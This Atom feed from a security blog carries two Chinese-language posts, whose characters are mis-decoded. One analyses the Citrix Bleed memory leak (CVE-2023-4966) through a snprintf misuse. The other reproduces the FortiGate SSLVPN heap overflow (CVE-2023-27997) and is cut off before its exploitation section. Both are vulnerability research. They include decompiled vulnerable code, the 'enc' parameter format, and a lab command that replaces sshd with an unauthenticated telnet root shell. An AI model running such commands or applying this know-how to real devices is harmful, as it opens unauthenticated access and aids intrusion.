<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Swing&#39;Blog æµ®ç”Ÿè‹¥æ¢¦</title>
  
  <subtitle>åŠªåŠ›æ˜¯ä¸ºäº† ç«™åœ¨ä¸‡äººä¸­å¤® æˆä¸ºåˆ«äººçš„å…‰</subtitle>
  <link href="https://bestwing.me/atom.xml" rel="self"/>
  
  <link href="https://bestwing.me/"/>
  <updated>2023-10-24T14:47:41.986Z</updated>
  <id>https://bestwing.me/</id>
  
  <author>
    <name>Swing</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2023-4966 Citrix  å†…å­˜æ³„æ¼</title>
    <link href="https://bestwing.me/CVE-2023-4966%20Citrix-memory-leak.html"/>
    <id>https://bestwing.me/CVE-2023-4966%20Citrix-memory-leak.html</id>
    <published>2023-10-24T14:10:14.000Z</published>
    <updated>2023-10-24T14:47:41.986Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL; DR"></a>TL; DR</h2><p>10æœˆ18æ—¥çš„æ—¶å€™æ³¨æ„åˆ°æ€æ°å®˜ç½‘å‘å¸ƒäº†ä¸€ä¸ªå®‰å…¨å…¬å‘Š: <a href="https://support.citrix.com/article/CTX579459/netscaler-adc-and-netscaler-gateway-security-bulletin-for-cve20234966-and-cve20234967">NetScaler ADC and NetScaler Gateway Security Bulletin for CVE-2023-4966 and CVE-2023-4967</a> ã€‚å…¶ä¸­æåˆ°ä¸€ä¸ªæ•æ„Ÿä¿¡æ¯æ³„éœ²çš„æ¼æ´ã€‚åœ¨ä»Šå¤©ï¼ˆ10æœˆ24æ—¥ï¼‰ï¼Œassetnote å‘å¸ƒäº†ä¸€äº›ç»†èŠ‚æ–‡ç« ï¼Œè¿™é‡Œç®€å•è®°å½•ä¸‹ã€‚</p><h2 id="æ¼æ´ç»†èŠ‚"><a href="#æ¼æ´ç»†èŠ‚" class="headerlink" title="æ¼æ´ç»†èŠ‚"></a>æ¼æ´ç»†èŠ‚</h2><p>è¿™é‡Œä»¥ 13.0-47 çš„å›ºä»¶ä¸ºä¾‹å­ï¼Œ ä»å›ºä»¶æ‹‰å‡º nsppe è¿™ä¸ªç¨‹åºï¼Œç”¨ IDA æ‰“å¼€åˆ†æã€‚ æœç´¢æ–‡ç« æåˆ°çš„å­—ç¬¦ä¸²å¯ä»¥çœ‹åˆ°å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  want_to_write_len = <span class="built_in">snprintf</span>(</span><br><span class="line">                        print_temp_rule,</span><br><span class="line">                        <span class="number">0x10000</span>,</span><br><span class="line">                        (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;&#123;\&quot;issuer\&quot;: \&quot;https://%.*s\&quot;, \&quot;authorization_endpoint\&quot;: \&quot;https://%.*s/oauth/id&quot;</span></span><br><span class="line">                                      <span class="string">&quot;p/login\&quot;, \&quot;token_endpoint\&quot;: \&quot;https://%.*s/oauth/idp/token\&quot;, \&quot;jwks_uri\&quot;: \&quot;h&quot;</span></span><br><span class="line">                                      <span class="string">&quot;ttps://%.*s/oauth/idp/certs\&quot;, \&quot;response_types_supported\&quot;: [\&quot;code\&quot;, \&quot;token\&quot;,&quot;</span></span><br><span class="line">                                      <span class="string">&quot; \&quot;id_token\&quot;], \&quot;id_token_signing_alg_values_supported\&quot;: [\&quot;RS256\&quot;], \&quot;end_sess&quot;</span></span><br><span class="line">                                      <span class="string">&quot;ion_endpoint\&quot;: \&quot;https://%.*s/oauth/idp/logout\&quot;, \&quot;frontchannel_logout_supported&quot;</span></span><br><span class="line">                                      <span class="string">&quot;\&quot;: true, \&quot;scopes_supported\&quot;: [\&quot;openid\&quot;, \&quot;ctxs_cc\&quot;], \&quot;claims_supported\&quot;: [&quot;</span></span><br><span class="line">                                      <span class="string">&quot;\&quot;sub\&quot;, \&quot;iss\&quot;, \&quot;aud\&quot;, \&quot;exp\&quot;, \&quot;iat\&quot;, \&quot;auth_time\&quot;, \&quot;acr\&quot;, \&quot;amr\&quot;, \&quot;em&quot;</span></span><br><span class="line">                                      <span class="string">&quot;ail\&quot;, \&quot;given_name\&quot;, \&quot;family_name\&quot;, \&quot;nickname\&quot;], \&quot;userinfo_endpoint\&quot;: \&quot;ht&quot;</span></span><br><span class="line">                                      <span class="string">&quot;tps://%.*s/oauth/idp/userinfo\&quot;&#125;&quot;</span>,</span><br><span class="line">......</span><br><span class="line">                        hostname);</span><br><span class="line">  authv2_json_resp = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)ns_vpn_send_response(a1, <span class="number">0x100040</span>LL, print_temp_rule, want_to_write_len) )</span><br><span class="line">  &#123;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œsnprintfå‡½æ•°è¢«ç”¨äºå°†hostnameå‚æ•°æ‹¼æ¥åˆ°print_temp_ruleå˜é‡ä¸­ï¼Œå¹¶æ ¹æ®è¿”å›çš„é•¿åº¦ï¼Œé€šè¿‡ns_vpn_send_responseå‡½æ•°è¿”å›HTTPè¯·æ±‚çš„ç»“æœã€‚è¿™ç§å¯¹snprintfçš„ä½¿ç”¨æ–¹æ³•æ˜¯ä¸€ä¸ªå¸¸è§çš„é”™è¯¯ã€‚è®©æˆ‘æƒ³åˆ°ä¸€ä¸ªé•¿äº­ä¹‹å‰å‘å¸ƒçš„ä¸€ç¯‡æ–‡ç«  <a href="https://zhuanlan.zhihu.com/p/26271959">å®æˆ˜æ ˆæº¢å‡ºï¼šä¸‰ä¸ªæ¼æ´æå®šä¸€å°è·¯ç”±å™¨</a>ã€‚ä¹Ÿæ˜¯ä½¿ç”¨snprintf ä»ç¼“å†²åŒºæ³„æ¼å†…å­˜ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-10-24-2fe3d848035af324ca8bae785143a63e-8711d2.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-10-24-2fe3d848035af324ca8bae785143a63e-8711d2.png" alt="image.png"></a></p><p>æ€»ç»“ä¸€ä¸‹å°±æ˜¯ï¼Œ snprintf è¿™ä¸ªå‡½æ•°åº”è¯¥è¿”å›çš„æ˜¯ â€æƒ³è¦å†™å…¥buffer çš„å­—ç¬¦ä¸²é•¿åº¦â€œ ï¼Œ è€Œä¸æ˜¯å®é™…å†™å…¥bufferçš„å­—ç¬¦é•¿é•¿åº¦ã€‚å¯ä»¥ä»ä¸€ä¸ª DEMO çœ‹å‡ºè¿™ä¸ªæ•ˆæœï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">âœ  Desktop cat test.c</span><br><span class="line">int <span class="function"><span class="title">main</span></span>() &#123;</span><br><span class="line">    char buf[8];</span><br><span class="line">    memset(buf,0,8);</span><br><span class="line">    int n1 = snprintf(buf, 8, <span class="string">&quot;%s&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buf: %s\n&quot;</span>, buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;n1: %d\n&quot;</span>, n1);</span><br><span class="line">    memset(buf,0,8);</span><br><span class="line">    int n2 = snprintf(buf, 8, <span class="string">&quot;%s&quot;</span>, <span class="string">&quot;aaaabbbbccccdddd&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buf: %s\n&quot;</span>, buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;n2: %d\n&quot;</span>, n2);</span><br><span class="line">&#125;</span><br><span class="line">âœ  Desktop ./a.out</span><br><span class="line">buf: aaa</span><br><span class="line">n1: 3</span><br><span class="line">buf: aaaabbb</span><br><span class="line">n2: 16</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œå½“æˆ‘æƒ³å†™å…¥ 16é•¿åº¦çš„å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œ n2çš„å€¼ä¸º 16ï¼Œ è€Œä¸æ˜¯å®é™…å†™å…¥çš„é•¿åº¦ã€‚ </p><blockquote><p>The functions snprintf() and vsnprintf() do not write more than size bytes (including the terminating null byte (â€™\0â€™))</p></blockquote><p>PoCï¼š</p><p>å…·ä½“ä¸€æ ·é•¿åº¦èƒ½ä¸èƒ½æ³„æ¼å‡º token ï¼Œ çœ‹èµ·æ¥å’Œç‰ˆæœ¬è¿˜æ˜¯æœ‰å…³ç³»çš„ï¼Œè‡³å°‘æˆ‘è¿™ä¸ªç‰ˆæœ¬åœ¨ <a href="https://raw.githubusercontent.com/assetnote/exploits/main/citrix/CVE-2023-4966/exploit.py">CVE-2023-4966</a>è¿™ä¸ªåˆ©ç”¨ä¸­æ˜¯æ‰“ä¸å‡ºæ¥çš„ã€‚åº”è¯¥å’Œä¸åŒæ ˆçš„å¤§å°ä¸ä¸€æ ·ã€‚å…·ä½“æˆ‘å°±ä¸è¿›ä¸€æ­¥è°ƒè¯•äº†ã€‚</p><p>å¦å¤–åˆ°è¾¾è¿™ä¸ªå‡½æ•°çš„è·¯ç”±ï¼Œé€šè¿‡å¯¹è¿™ä¸ªå‡½æ•° <code>ns_aaa_oauth_send_openid_config</code> è¿›è¡Œäº¤å‰å¼•ç”¨ä¸€ä¸‹å­å°±çœ‹åˆ°äº†ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-10-24-eccaaad8f179b9f13f8bf38ecc9698c8-ca5187.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-10-24-eccaaad8f179b9f13f8bf38ecc9698c8-ca5187.png" alt="image.png"></a></p><h2 id="Reference-link"><a href="#Reference-link" class="headerlink" title="Reference link"></a>Reference link</h2><p><a href="https://www.assetnote.io/resources/research/citrix-bleed-leaking-session-tokens-with-cve-2023-4966">Citrix Bleed: Leaking Session Tokens with CVE-2023-4966</a><br><a href="https://zhuanlan.zhihu.com/p/26271959">å®æˆ˜æ ˆæº¢å‡ºï¼šä¸‰ä¸ªæ¼æ´æå®šä¸€å°è·¯ç”±å™¨</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="æ¼æ´åˆ†æ" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Redis" scheme="https://bestwing.me/tags/Redis/"/>
    
    <category term="CVE-2023-4966" scheme="https://bestwing.me/tags/CVE-2023-4966/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow</title>
    <link href="https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html"/>
    <id>https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html</id>
    <published>2023-09-20T16:00:00.000Z</published>
    <updated>2023-09-22T03:09:07.645Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL; DR"></a>TL; DR</h2><p>ç”±äº<code>CVE-2023-27997</code> æ¼æ´çš„å½±å“æ¯”è¾ƒå¤§ï¼Œæ‰€ä»¥æˆ‘ä¸€ç›´æ²¡æœ‰å…¬å¼€è¿™ç¯‡åšå®¢ï¼Œ ä½†æ˜¯è·ç¦»è¯¥æ¼æ´å…¬å¼€å·²ç»å·®ä¸å¤šè¿‡å»äº†ä¸‰ä¸ªæœˆäº†ï¼Œ å…¬ç½‘çš„è®¾å¤‡åº”è¯¥éƒ½ä¿®çš„å·®ä¸å¤šäº†å§ï¼Œ å› æ­¤è¿™é‡Œå¯ä»¥å¤§å®¶åˆ†äº«ä¸€ä¸‹å½“æ—¶æˆ‘å’Œ@leommxj ä¸€èµ·å¤ç°è¯¥æ¼æ´çš„ç¬”è®°ã€‚</p><p>æ›´å…·ä½“çš„æ¼æ´ç»†èŠ‚å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š <a href="https://blog.lexfo.fr/xortigate-cve-2023-27997.html">Pre-authentication Remote Code Execution on Fortigate VPN </a>, è€Œæˆ‘è¿™é‡Œåˆ†æç‰ˆæœ¬ä¾æ—§æ˜¯ 7.2.2</p><h2 id="æ¼æ´ç¯å¢ƒæ­å»º"><a href="#æ¼æ´ç¯å¢ƒæ­å»º" class="headerlink" title="æ¼æ´ç¯å¢ƒæ­å»º"></a>æ¼æ´ç¯å¢ƒæ­å»º</h2><p>å‚è€ƒå¯ä»¥å‚è€ƒæˆ‘ä¸Šä¸€ç¯‡æ–‡ç«  ã€ŠCVE-2022-42475-FortiGate-SSLVPN-HeapOverflowã€‹</p><p>åœ¨è°ƒè¯•çš„æ—¶å€™ ï¼Œ æ‰¾ @leommxj å’Œ @explorer å¸®æˆ‘é…ç½®äº†ç½‘ç»œç¯å¢ƒï¼Œ ä¸€å¼€å§‹ç”¨çš„æ˜¯ gdb + vmware çš„è°ƒè¯•æ–¹æ³•ï¼Œåé¢æ”¹ç”¨ gdbserver + gdb çš„æ–¹æ³•äº†ï¼Œ ç”±äº fortigate çš„é˜²ç«å¢™åŸå› ï¼Œæˆ‘ä»¬å¤ç”¨äº† 22 ç«¯å£ å’Œ23 ç«¯å£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kill -9 $(pidof sshd) &amp;&amp; .&#x2F;busybox_TELNETD -b 0.0.0.0:22 -l &#x2F;bin&#x2F;sh</span><br><span class="line">kill -9 $(pidof telnetd) &amp;&amp; .&#x2F;gdbserver 0.0.0.0:23 --attach  $(pidof sslvpnd)</span><br></pre></td></tr></table></figure><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>å½“æˆ‘ä»¬å‘ fortigate sslvpn å‘é€ä¸€ä¸ª <code>enc</code> çš„ HTTP å‚æ•°çš„æ—¶å€™, ä¼šè¿›åˆ°ä¸€ä¸ª <code>parse_enc_data</code> çš„å‡½æ•°é€»è¾‘é‡Œ. </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-8b343fc31d4a504a4d459250587a38e4-447367.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-8b343fc31d4a504a4d459250587a38e4-447367.png" alt="image.png"></a></p><p>å¦å¤–è¿™ä¸ª <code>enc</code> å¤„ç†çš„ URI æœ‰å¾ˆå¤šå¯ä»¥è¿›æ¥, åŒ…æ‹¬ <code>/remote/hostcheck_validate</code>  ä»¥åŠ ^[1] æåˆ°çš„ <code>/remote/logincheck</code> , å…·ä½“ URI çš„é€‰æ‹©,æˆ‘ä»¬åæ–‡æ¥ç€ä¼šæåˆ° ã€‚è¿™é‡Œæ¥ç€åˆ†æ  <code>parse_enc_data</code> å‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">parse_enc_data</span><span class="params">(__int64 a1, __int64 *pool, <span class="keyword">const</span> <span class="keyword">char</span> *in)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-&quot;+&quot; TO EXPAND]</span></span><br><span class="line"></span><br><span class="line">  v30 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(in);                              <span class="comment">// in (enc) : AA BB CC DD  XX XX HACKED HACKED ...</span></span><br><span class="line">                                                <span class="comment">//               SEED      SIZE     CIPHERTEXT</span></span><br><span class="line">  int_len = v4;</span><br><span class="line">  lenOfData = v4;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)v4 &lt;= <span class="number">11</span> || (v4 &amp; <span class="number">1</span>) != <span class="number">0</span> )         <span class="comment">// enc çš„é•¿åº¦è¦å¤§äº11, ä¸”å¶æ•°</span></span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é¦–å…ˆè¿›åˆ°å‡½æ•°é‡Œï¼Œ ä¼šå…ˆåˆ¤æ–­ <code>enc</code> å‚æ•°çš„å€¼æ˜¯å¦é•¿åº¦å¤§äº11, ä¸”å¶æ•° ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MD5Data(salt, (__int64)in, <span class="number">8</span>, (__int64)md5);</span><br><span class="line">out = (__int16 *)alignedAlloc(*pool, (int_len &gt;&gt; <span class="number">1</span>) + <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>å½“ç¬¦åˆè¦æ±‚åï¼Œ ä¼šä»¥é•¿åº¦çš„ 1/2 çš„å¤§å°åˆ†é…ä¸€ä¸ª buffer , ç„¶åä¸­é—´ä¼šç»è¿‡ä¸€äº›æ•°æ®å¤„ç†ï¼Œç„¶ååˆ°è¾¾å¦å¤–ä¸€ä¸ª check</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">out = decodedData_ + <span class="number">2</span>;</span><br><span class="line">xored_given_len = decodedData_[<span class="number">2</span>];</span><br><span class="line">given_len = (<span class="keyword">unsigned</span> __int8)(xored_given_len ^ md5[<span class="number">0</span>]);</span><br><span class="line">BYTE1(given_len) = md5[<span class="number">1</span>] ^ HIBYTE(xored_given_len);</span><br><span class="line">payloadLength = (<span class="keyword">unsigned</span> __int8)(xored_given_len ^ md5[<span class="number">0</span>]);<span class="comment">// æ£€æŸ¥å¤§å°</span></span><br><span class="line"><span class="keyword">if</span> ( int_len - <span class="number">5</span> &lt;= payloadLength )</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  v17 = decodedData_ + <span class="number">3</span>;</span><br><span class="line">  out = v17;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)xored_given_len != md5[<span class="number">0</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(payloadLength - <span class="number">1</span>);</span><br><span class="line">    i = <span class="number">0L</span>L;</span><br><span class="line">    v20 = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *((_BYTE *)v17 + i) ^= md5[v20];    <span class="comment">// bof</span></span><br><span class="line">      <span class="keyword">if</span> ( v18 == i )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v20 = ((_BYTE)i + <span class="number">3</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (((_BYTE)i + <span class="number">3</span>) &amp; <span class="number">0xF</span>) == <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line">      v17 = out;</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    v17 = (__int16 *)((<span class="keyword">char</span> *)out + (<span class="keyword">unsigned</span> __int16)given_len);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¼šå°†æ•°æ®çš„é•¿åº¦ï¼ˆå®é™…ä¼ å…¥çš„é•¿åº¦ ï¼‰ å’Œ <code>enc</code> è¿™ä¸ªå‚æ•°å®šä¹‰çš„ payload çš„é•¿åº¦æ¯”è¾ƒï¼Œ å¦‚æœç¬¦åˆ  <code>int_len - 5 &lt;= payloadLength</code> ï¼Œ å³å®é™…é•¿åº¦å¤§äºå®šä¹‰çš„é•¿åº¦ï¼Œ å³æ¥ç€å¾€ä¸‹èµ°ã€‚ æ³¨æ„è¿™é‡Œä¼šå‡ºç°ä¸€ä¸ªå®‰å…¨é—®é¢˜ï¼š</p><p>å› ä¸ºå®é™…åˆ†é…çš„buffer çš„é•¿åº¦åº”è¯¥æ˜¯å®é™…é•¿åº¦çš„ 1/2 ï¼Œè€Œè¿™é‡Œå´æ˜¯ç”¨åŸæ¥çš„é•¿åº¦æ¯”è¾ƒçš„ï¼Œå› æ­¤åé¢ä¼šå‘ç”Ÿæº¢å‡ºã€‚ä½†æ˜¯è¿™é‡Œçš„æº¢å‡ºçš„å­—èŠ‚æ˜¯ä¸€ä¸ª md5 å¼‚æˆ–, è¿™é‡Œä¼šå¯¹æˆ‘ä»¬åé¢çš„åˆ©ç”¨æå‡ºä¸€ç‚¹ç‚¹çš„éš¾åº¦,ä½†æ˜¯ä½œè€…å´ç”¨äº†ä¸€ä¸ªå¾ˆå·§å¦™çš„æ¥å®Œæˆ ã€‚</p><p>è¿™é‡Œç®€å•æ€»ç»“ä¸‹è¿™ä¸ªå‡½æ•°å’Œæç‚¼ä¸‹ <code>enc</code> çš„ç»“æ„, é¦–å…ˆ <code>enc</code> å‚æ•°æ˜¯ä¸€ä¸ªåŒ…å« seedã€sizeï¼ˆ2 ä¸ªå­—èŠ‚ï¼‰å’Œæ•°æ®çš„ç»“æ„ã€‚å¤§å°å’Œæ•°æ®éƒ½æ˜¯åŠ å¯†çš„ã€‚ å¤§è‡´å°±ä¸‹å›¾çš„æ ·å­.</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-f56028c12c14f7a25eea4f193cd88886-95ed7a.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-f56028c12c14f7a25eea4f193cd88886-95ed7a.png" alt="image.png"></a></p><p>seed å­˜å‚¨ä¸º 8 ä¸ªåå…­è¿›åˆ¶å­—ç¬¦ï¼Œç”¨äºè®¡ç®— XOR å¯†é’¥æµçš„ç¬¬ä¸€ä¸ªçŠ¶æ€ï¼š</p><p><code>S0 = MD5(salt|seed| &quot;GCC is the GNU Compiler Collection.&quot;)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">MD5Data</span><span class="params">(<span class="keyword">char</span> *salt, __int64 enc, <span class="keyword">int</span> size, __int64 output)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  <span class="title">MD5_Init</span><span class="params">(v8)</span></span>;</span><br><span class="line">  v6 = <span class="built_in">strlen</span>(salt);</span><br><span class="line">  MD5_Update(v8, salt, v6);</span><br><span class="line">  MD5_Update(v8, enc, size);</span><br><span class="line">  MD5_Update(v8, <span class="string">&quot;GCC is the GNU Compiler Collection.&quot;</span>, <span class="number">35L</span>L);</span><br><span class="line">  MD5_Final(output, v8);</span><br><span class="line">  <span class="keyword">return</span> v9 - __readfsqword(<span class="number">0</span>x</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>salt</code> æ˜¯ç”±æœåŠ¡å™¨åˆ›å»ºçš„éšæœºå€¼, å¯ä»¥é€šè¿‡ <code>GET /remote/info HTTP/1.1</code> è·å–åˆ° </p><p>å¯†é’¥æµçš„å…¶ä»–çŠ¶æ€è®¡ç®—å¦‚ä¸‹ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-ba186e829988f5da44acd8c00a454950-121174.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-ba186e829988f5da44acd8c00a454950-121174.png" alt="image.png"></a><br>å‡½æ•°è¡Œä¸º:</p><ol><li>è®¡ç®— MD5ï¼ˆ16 å­—èŠ‚ï¼‰ï¼Œè¿™æ˜¯æ¥è‡ªç›å’Œç§å­çš„å¯†é’¥çš„ç¬¬ä¸€ä¸ªçŠ¶æ€ï¼ˆin çš„å‰ 8 ä¸ªå­—ç¬¦ï¼‰</li><li>åˆ†é…å¤§å°ä¸º in_len / 2 + 1ã€out å’Œåå…­è¿›åˆ¶è§£ç è¾“å…¥çš„ç¼“å†²åŒº</li><li>é€šè¿‡å°†æœ‰æ•ˆè´Ÿè½½çš„å‰ä¸¤ä¸ªå­—èŠ‚ä¸å¯†é’¥çš„å‰ä¸¤ä¸ªå­—èŠ‚è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œè®¡ç®—ç”¨æˆ·ç»™å®šçš„é•¿åº¦ given_len</li><li>è¾¹ç•Œæ£€æŸ¥ï¼šéªŒè¯ç»™å®šçš„é•¿åº¦ä¸å¤§äºç¼“å†²åŒºçš„å¤§å°</li><li>å°±åœ°è§£å¯†æ•´ä¸ªå­—ç¬¦ä¸²ï¼šå¯¹å‰ 14 ä¸ªå­—èŠ‚è¿›è¡Œ XORï¼Œç„¶åè®¡ç®—ä¸€ä¸ªæ–°çŠ¶æ€ ğ¾ 1ä¸ª ï¼Œç”¨å®ƒå¯¹æ¥ä¸‹æ¥çš„ 16 ä¸ªå­—èŠ‚è¿›è¡Œå¼‚æˆ–ï¼Œç„¶åé‡å¤ã€‚</li><li>åœ¨è§£å¯†æ•°æ®çš„æœ«å°¾æ”¾ç½®ä¸€ä¸ª NULL å­—èŠ‚</li><li>å½“ç¨‹åºæ£€æŸ¥ç»™å®šé•¿åº¦ä¸å¤§äºå‘é€çš„æœ‰æ•ˆè´Ÿè½½çš„é•¿åº¦æ—¶ï¼Œå®ƒä¼šå°† in_len ä¸ given_len è¿›è¡Œæ¯”è¾ƒã€‚ä½†æ˜¯ï¼Œå‰è€…ä»¥åå…­è¿›åˆ¶æè¿°æœ‰æ•ˆè´Ÿè½½çš„é•¿åº¦ï¼ˆä¾‹å¦‚â€œ41424343â€ï¼‰ï¼Œè€Œåè€…ä»¥åŸå§‹å­—èŠ‚æè¿°å…¶å¤§å°ï¼ˆä¾‹å¦‚â€œABCDâ€ï¼‰ã€‚å› æ­¤ï¼Œgiven_len å¯ä»¥æ˜¯å®ƒåº”è¯¥çš„ä¸¤å€å¤§ã€‚å› æ­¤é€ æˆäº†æº¢å‡º</li></ol><blockquote><p>è¿™é‡Œç¨å¾®åæ§½ä¸€ä¸‹ï¼Œ IDA çš„åç¼–è¯‘é”™è¯¯å¯¼è‡´å¾ˆå¤šæ–‡ç« å¯¹è¯¥æ¼æ´çš„äº§ç”ŸåŸå› çš„æè¿°æœ‰äº›é”™è¯¯</p><p><a href="https://twitter.com/bestswngs/status/1670709186509045761">wrong results of Hex-Rays</a></p></blockquote><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" 